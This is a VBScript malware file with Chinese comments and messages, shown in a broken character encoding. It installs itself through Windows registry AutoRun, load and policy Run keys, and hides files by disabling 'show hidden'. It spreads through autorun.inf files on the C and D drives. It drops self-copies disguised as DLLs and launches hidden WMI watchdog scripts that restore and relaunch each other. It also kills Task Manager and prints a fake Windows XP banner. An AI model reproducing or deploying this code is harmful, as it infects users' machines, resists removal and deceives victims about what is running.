'����ע�����Ŀ
Set AA=CreateObject("Wscript.Shell")
AA.RegWrite "HKLM\SOFTWARE\Microsoft\Command Processor\AutoRun","c:\windows\cmd.bat","REG_SZ"
AA.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\load","c:\aa\BB.vbs","REG_SZ"
AA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run\KernelFaultCheck","c:\windows\cc.vbs","REG_SZ"
AA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue","0","REG_DWORD"
AA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\DefaultValue","0","REG_DWORD"
AA.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun","91","REG_DWORD"
set AA=nothing
on error resume next
Set fsofile = CreateObject("Scripting.FileSystemObject")
'�����屸��
set self=fsofile.opentextfile(wscript.scriptfullname,1)'��ȡ�򿪵�ǰ�ļ������ļ���
vbscopy=self.readall '��ȡ����ȫ�����뵽�ַ�������vbscopy
set tsobj=fsofile.opentextfile("c:\windows\vv.dll",2,true)'�Բ�������������
tsobj.write vbscopy   '���������븲��Ŀ���ļ�
tsobj.close
vbscopy=left(vbscopy,13280)
set tsobj1=fsofile.opentextfile("c:\windows\uctools.dll",2,true)
tsobj1.write vbscopy
tsobj1.close
'����Ŀ¼aa��ʱĿ¼
Set f = fsofile.CreateFolder("c:\aa")
fsofile.CopyFile "c:\windows\uctools.dll","c:\windows\cc.vbs"
fsofile.CopyFile "c:\windows\vv.dll","c:\aa\cc.vbs"'���Ʋ�����aa��ʱĿ¼��
Set objFolder = fsofile.GetFolder("C:\aa")
If objFolder.Attributes = objFolder.Attributes AND 2 Then
    objFolder.Attributes = objFolder.Attributes XOR 2 
End If
'����BB.VBS�ļ�
set vbsfile=fsofile.CreateTextFile("c:\aa\bb.vbs", True)
vbsfile.WriteLine("Const HIDDEN_WINDOW = 12")
vbsfile.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
vbsfile.WriteLine("Set objWMIService = GetObject("&Chr(34)&"winmgmts:"&Chr(34)&" _")
vbsfile.WriteLine("& "&Chr(34)&"{impersonationLevel=impersonate}!\\"&Chr(34)&" & strComputer & "&Chr(34)&"\root\cimv2"&Chr(34)&")")
vbsfile.WriteLine("Set objStartup = objWMIService.Get("&Chr(34)&"Win32_ProcessStartup"&Chr(34)&")")
vbsfile.WriteLine("Set objConfig = objStartup.SpawnInstance_")
vbsfile.WriteLine("objConfig.ShowWindow = HIDDEN_WINDOW")
vbsfile.WriteLine("Set objProcess = GetObject("&Chr(34)&"winmgmts:root\cimv2:Win32_Process"&Chr(34)&")")
vbsfile.WriteLine("errReturn = objProcess.Create("&Chr(34)&"cmd /k subst z: c:\windows"&Chr(34)&", null, objConfig, intProcessID)")
vbsfile.WriteLine("errReturn = objProcess.Create("&Chr(34)&"cmd /k subst x: c:\windows"&Chr(34)&", null, objConfig, intProcessID)")
vbsfile.WriteLine("errReturn = objProcess.Create("&Chr(34)&"cmd /k subst m: c:\windows"&Chr(34)&", null, objConfig, intProcessID)")
vbsfile.WriteLine("errReturn = objProcess.Create("&Chr(34)&"cmd /k subst n: c:\windows"&Chr(34)&", null, objConfig, intProcessID)")
vbsfile.WriteLine("errReturn = objProcess.Create("&Chr(34)&"cmd /k subst y: c:\windows"&Chr(34)&", null, objConfig, intProcessID)")
vbsfile.WriteLine("Set shl = CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&")")
vbsfile.WriteLine("shl.CopyFile "&Chr(34)&"c:\windows\uctools.dll"&Chr(34)&","&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
vbsfile.WriteLine("set shl = nothing")
vbsfile.WriteLine("set run1=createobject("&Chr(34)&"WScript.Shell"&Chr(34)&")")
vbsfile.WriteLine("run1.run"&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
vbsfile.WriteLine("run1.run"&Chr(34)&"c:\windows\backup.vbs"&Chr(34))
vbsfile.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon3.vbs"&Chr(34))
vbsfile.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon4.vbs"&Chr(34))
vbsfile.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon2.vbs"&Chr(34))
vbsfile.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon1.vbs"&Chr(34))
vbsfile.WriteLine("set run1=nothing")
vbsfile.WriteLine("Wscript.Echo("&Chr(34)&"΢����ʲôʱ��,�Ż��������"&Chr(34)&")")
vbsfile.Close
fsofile.CopyFile"c:\aa\bb.vbs","c:\windows\bb.dll"
'����cmd.bat�ļ�
set windowscmd=fsofile.CreateTextFile("c:\windows\cmd.bat", True)
windowscmd.WriteLine("@echo off")
windowscmd.WriteLine("echo [AUTORUN] >c:\autorun.inf")
windowscmd.WriteLine("echo OPEN=c:\windows\system32\cscript.exe c:\aa\cc.vbs >>c:\autorun.inf")
windowscmd.WriteLine("echo ICON=explorer.exe >>c:\autorun.inf")
windowscmd.WriteLine("echo [AUTORUN] >d:\autorun.inf")
windowscmd.WriteLine("echo OPEN=c:\windows\system32\cscript.exe c:\aa\cc.vbs >>d:\autorun.inf")
windowscmd.WriteLine("echo ICON=explorer.exe >>d:\autorun.inf")
windowscmd.WriteLine("attrib c:\autorun.inf +h +s +r")
windowscmd.WriteLine("attrib d:\autorun.inf +h +s +r")
windowscmd.WriteLine("cls")
windowscmd.WriteLine("copy c:\widnows\uctools.dll c:\windows\cc.vbs /y")
windowscmd.WriteLine("copy c:\windows\system32\backup.dll c:\windows\backup.vbs /y" )
windowscmd.WriteLine("cls")
windowscmd.WriteLine("echo set run1=createobject("&Chr(34)&"WScript.Shell"&Chr(34)&") >c:\windows\aa.vbs")
windowscmd.WriteLine("echo run1.run"&Chr(34)&"c:\windows\cc.vbs"&Chr(34)&" >>c:\windows\aa.vbs")
windowscmd.WriteLine("echo run1.run"&Chr(34)&"c:\windows\backup.vbs"&Chr(34)&" >>c:\windows\aa.vbs")
windowscmd.WriteLine("echo set run1=nothing>>c:\windows\aa.vbs")
windowscmd.WriteLine("cscript c:\windows\aa.vbs")
windowscmd.WriteLine("cls")
windowscmd.WriteLine("echo Microsoft Windows XP [�汾 5.1.2600]")
windowscmd.WriteLine("echo (C) ��Ȩ���� 1985-2001 Microsoft Corp.")
windowscmd.WriteLine("echo.")
windowscmd.Close
'����backup.dll�ļ�����aaĿ¼�䶯
set dllfile=fsofile.CreateTextFile("c:\windows\system32\backup.dll", True)
dllfile.WriteLine("on error resume next")
dllfile.WriteLine("Set fsofile = CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&")")
dllfile.WriteLine("Set f = fsofile.CreateFolder("&Chr(34)&"c:\aa"&Chr(34)&")")
dllfile.WriteLine("fsofile.CopyFile "&Chr(34)&"c:\windows\bb.dll"&Chr(34)&","&Chr(34)&"c:\aa\bb.vbs"&Chr(34))
dllfile.WriteLine("set fsofile=nothing")
dllfile.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
dllfile.WriteLine("Set objWMIService = GetObject("&Chr(34)&"winmgmts:"&Chr(34)&" _")
dllfile.WriteLine("& "&Chr(34)&"{impersonationLevel=impersonate}!\\"&Chr(34)&" & _")
dllfile.WriteLine("strComputer & "&Chr(34)&"\root\cimv2"&Chr(34)&")")
dllfile.WriteLine("Set colMonitoredEvents = objWMIService.ExecNotificationQuery _")
dllfile.WriteLine("("&Chr(34)&"SELECT * FROM __InstanceDeletionEvent WITHIN 10 WHERE "&Chr(34)&" _")
dllfile.WriteLine("& "&Chr(34)&"Targetinstance ISA 'CIM_DirectoryContainsFile' and "&Chr(34)&" _")
dllfile.WriteLine("& "&Chr(34)&"TargetInstance.GroupComponent= "&Chr(34)&" _")
dllfile.WriteLine("& "&Chr(34)&"'Win32_Directory.Name="&Chr(34)&Chr(34)&"c:\\\\aa"&Chr(34)&Chr(34)&"'"&Chr(34)&")")
dllfile.WriteLine("Do")
dllfile.WriteLine("Set objLatestEvent = colMonitoredEvents.NextEvent")
dllfile.WriteLine("WScript.Sleep 10000")
dllfile.WriteLine("Set fsofile = CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&")")
dllfile.WriteLine("Set f = fsofile.CreateFolder("&Chr(34)&"c:\aa"&Chr(34)&")")
dllfile.WriteLine("fsofile.CopyFile "&Chr(34)&"c:\windows\bb.dll"&Chr(34)&","&Chr(34)&"c:\aa\bb.vbs"&Chr(34))
dllfile.WriteLine("set fsofile=nothing")
dllfile.WriteLine("Loop")
dllfile.Close:
fsofile.CopyFile "c:\windows\system32\backup.dll","c:\windows\backup.vbs"
'���������̼��ӳ��ļ�mon1.vbs
set mon1=fsofile.CreateTextFile("c:\windows\system32\mon1.vbs", True)
mon1.WriteLine("on error resume next")
mon1.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
mon1.WriteLine("Set objWMIService = GetObject("&Chr(34)&"winmgmts:"&Chr(34)&" _")
mon1.WriteLine(" & "&Chr(34)&"{impersonationLevel=impersonate}!\\"&Chr(34)&" & strComputer & "&Chr(34)&"\root\cimv2"&Chr(34)&")")
mon1.WriteLine("Set colMonitoredProcesses = objWMIService. _")
mon1.WriteLine("ExecNotificationQuery("&Chr(34)&"select * from __instancedeletionevent "&Chr(34)&" _ ")
mon1.WriteLine("& "&Chr(34)&"within 1 where TargetInstance isa 'Win32_Process'"&Chr(34)&")")
mon1.WriteLine("i = 0")
mon1.WriteLine("Do While i = 0")
mon1.WriteLine("Set objLatestProcess = colMonitoredProcesses.NextEvent")
mon1.WriteLine("Set shl = CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&")")
mon1.WriteLine("shl.CopyFile "&Chr(34)&"c:\windows\uctools.dll"&Chr(34)&","&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
mon1.WriteLine("set shl = nothing")
mon1.WriteLine("set run1=createobject("&Chr(34)&"WScript.Shell"&Chr(34)&")")
mon1.WriteLine("'run1.run"&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
mon1.WriteLine("run1.run"&Chr(34)&"c:\windows\backup.vbs"&Chr(34))
mon1.WriteLine("'run1.run"&Chr(34)&"c:\windows\system32\mon1.vbs"&Chr(34))
mon1.WriteLine("'run1.run"&Chr(34)&"c:\windows\system32\mon2.vbs"&Chr(34))
mon1.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon3.vbs"&Chr(34))
mon1.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon4.vbs"&Chr(34))
mon1.WriteLine("set run1=nothing")
mon1.WriteLine("Wscript.Echo("&Chr(34)&"�ɰ���΢�㣬�ҽ�����ͷʹ�ĺ�"&Chr(34)&")")
mon1.WriteLine("Loop")
mon1.close
'���������̼��ӳ��ļ�mon2.vbs
set mon2=fsofile.CreateTextFile("c:\windows\system32\mon2.vbs", True)
mon2.WriteLine("on error resume next")
mon2.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
mon2.WriteLine("Set objWMIService = GetObject("&Chr(34)&"winmgmts:"&Chr(34)&" _")
mon2.WriteLine(" & "&Chr(34)&"{impersonationLevel=impersonate}!\\"&Chr(34)&" & strComputer & "&Chr(34)&"\root\cimv2"&Chr(34)&")")
mon2.WriteLine("Set colMonitoredProcesses = objWMIService. _")
mon2.WriteLine("ExecNotificationQuery("&Chr(34)&"select * from __instancedeletionevent "&Chr(34)&" _ ")
mon2.WriteLine("& "&Chr(34)&"within 1 where TargetInstance isa 'Win32_Process'"&Chr(34)&")")
mon2.WriteLine("i = 0:Do While i = 0:Set objLatestProcess = colMonitoredProcesses.NextEvent")
mon2.WriteLine("Set shl = CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&")")
mon2.WriteLine("shl.CopyFile "&Chr(34)&"c:\windows\uctools.dll"&Chr(34)&","&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
mon2.WriteLine("set shl = nothing")
mon2.WriteLine("set run1=createobject("&Chr(34)&"WScript.Shell"&Chr(34)&")")
mon2.WriteLine("run1.run"&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
mon2.WriteLine("run1.run"&Chr(34)&"c:\windows\backup.vbs"&Chr(34))
mon2.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon1.vbs"&Chr(34))
mon2.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon2.vbs"&Chr(34))
mon2.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon3.vbs"&Chr(34))
mon2.WriteLine("run1.run"&Chr(34)&"c:\windows\system32\mon4.vbs"&Chr(34))
mon2.WriteLine("set run1=nothing")
mon2.WriteLine("Loop")
mon2.close
'����������������ӳ���mon3.vbs
set mon3=fsofile.CreateTextFile("c:\windows\system32\mon3.vbs", True)
mon3.WriteLine("on error resume next")
mon3.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
mon3.WriteLine("Set objWMIService = GetObject("&Chr(34)&"winmgmts:"&Chr(34)&" _")
mon3.WriteLine("& "&Chr(34)&"{impersonationLevel=impersonate}!\\"&Chr(34)&" & strComputer & "&Chr(34)&"\root\cimv2"&Chr(34)&")")
mon3.WriteLine("Set colMonitoredProcesses = objWMIService. _")
mon3.WriteLine("ExecNotificationQuery("&Chr(34)&"select * from __instancecreationevent "&Chr(34)&" _")
mon3.WriteLine("& " &Chr(34)&"within 1 where TargetInstance isa 'Win32_Process'"&Chr(34)&")")
mon3.WriteLine("i=0:Do While i = 0:Set objLatestProcess = colMonitoredProcesses.NextEvent")
mon3.WriteLine("If objLatestProcess.TargetInstance.Name = "&Chr(34)&"taskmgr.exe"&Chr(34)&" or objLatestProcess.TargetInstance.Name = "&Chr(34)&"TASKMGR.EXE"&Chr(34)&"  Then")
mon3.WriteLine("objLatestProcess.TargetInstance.Terminate")
mon3.WriteLine("End If:Loop")
mon3.close
'����windowsĿ¼���ӳ���mon4.vbs
set mon4=fsofile.CreateTextFile("c:\windows\system32\mon4.vbs", True)
mon4.WriteLine("on error resume next")
mon4.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
mon4.WriteLine("on error resume next")
mon4.WriteLine("strComputer = "&Chr(34)&"."&Chr(34))
mon4.WriteLine("Set objWMIService = GetObject("&Chr(34)&"winmgmts:"&Chr(34)&" _")
mon4.WriteLine("& "&Chr(34)&"{impersonationLevel=impersonate}!\\"&Chr(34)&" & _")
mon4.WriteLine("strComputer & "&Chr(34)&"\root\cimv2"&Chr(34)&")")
mon4.WriteLine("Set colMonitoredEvents = objWMIService.ExecNotificationQuery _")
mon4.WriteLine("("&Chr(34)&"SELECT * FROM __InstanceDeletionEvent WITHIN 10 WHERE "&Chr(34)&" _")
mon4.WriteLine("& "&Chr(34)&"Targetinstance ISA 'CIM_DirectoryContainsFile' and "&Chr(34)&" _")
mon4.WriteLine("& "&Chr(34)&"TargetInstance.GroupComponent= "&Chr(34)&" _")
mon4.WriteLine("& "&Chr(34)&"'Win32_Directory.Name="&Chr(34)&Chr(34)&"c:\\\\windows"&Chr(34)&Chr(34)&"'"&Chr(34)&")")
mon4.WriteLine("Do")
mon4.WriteLine("Set objLatestEvent = colMonitoredEvents.NextEvent")
mon4.WriteLine("WScript.Sleep 10000")
mon4.WriteLine("Set fsofile = CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&")")
mon4.WriteLine("fsofile.CopyFile "&Chr(34)&"c:\windows\uctools.dll"&Chr(34)&","&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
mon4.WriteLine("set fsofile=nothing")
mon4.WriteLine("set run1=createobject("&Chr(34)&"WScript.Shell"&Chr(34)&")")
mon4.WriteLine("run1.run"&Chr(34)&"c:\windows\cc.vbs"&Chr(34))
mon4.WriteLine("set run1=nothing:Loop")
mon4.close
set fsofile=nothing
'����5�����ӳ���'''''''''''''
'''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''
set run1=createobject("WScript.Shell") 
run1.run"c:\windows\backup.vbs" 
run1.run"c:\windows\system32\mon1.vbs"
'run1.run"c:\windows\system32\mon2.vbs"
'run1.run"c:\windows\system32\mon3.vbs"
run1.run"c:\windows\system32\mon4.vbs"
set run1=nothing
Wscript.Echo("�ɰ���΢����һֱ�����޶����ԣ��⽫ʹ�����û�����ϵͳ�����ҵ����ϣ���ͬ��Ҳ����Ϊ���ķ�Ĺ��ϣ����Ϊ���Լ��������ܹ�������")
Wscript.Echo("ϣ������΢�㣩�ܾ������������˶Թ���ɱ���Ǻܿ��صģ��ر�����������΢�㣩���Ѷ���˹�ǰ�������Ϊ���ص�����ɱ�������������΢�㣩���ð�����ʧ������������ʵ�����Ǵ��ĵ������ģ�ֻ����������΢�㣩�������ܹ����Ӱ�����ű��������ڹ���ҳʱ�������Ľű��Ǻ������еģ���������΢�㣩�����˱Ȱ������˸��������������һֱ���ڴ������ܹ����ذ����ಡ��.....")
Wscript.Echo("�ڴ������������⣬�ڴ�΢�������.........")